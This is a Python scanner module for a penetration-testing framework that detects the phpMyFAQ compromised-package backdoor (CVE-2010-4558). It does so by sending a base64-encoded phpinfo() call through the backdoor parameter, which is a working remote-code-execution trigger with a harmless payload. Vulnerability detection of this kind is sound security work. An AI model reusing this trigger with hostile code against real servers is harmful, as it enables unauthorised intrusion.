#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""phpMyFAQ backdoor (CVE-2010-4558)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpMyFAQ - Compromised Package Backdoor Detection (CVE-2010-4558)',
        'description': (
            'Detects CVE-2010-4558 via index.php?phpmyfaq_new=cGhwaW5mbygpOwo= (phpinfo();).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2010', 'phpmyfaq', 'backdoor', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-4558',
        ],
        'cve': 'CVE-2010-4558',
    }

    def run(self):
        for base in ('', '/phpmyfaq', '/faq'):
            path = f'{base}/index.php?phpmyfaq_new=cGhwaW5mbygpOwo='
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            body = (r.text or '') if r else ''
            if '<title>phpinfo' in body and 'PHP Core' in body:
                self.set_info(
                    severity='critical',
                    reason='phpMyFAQ compromised package backdoor (CVE-2010-4558)',
                    path=f'{base}/index.php',
                )
                return True
        return False
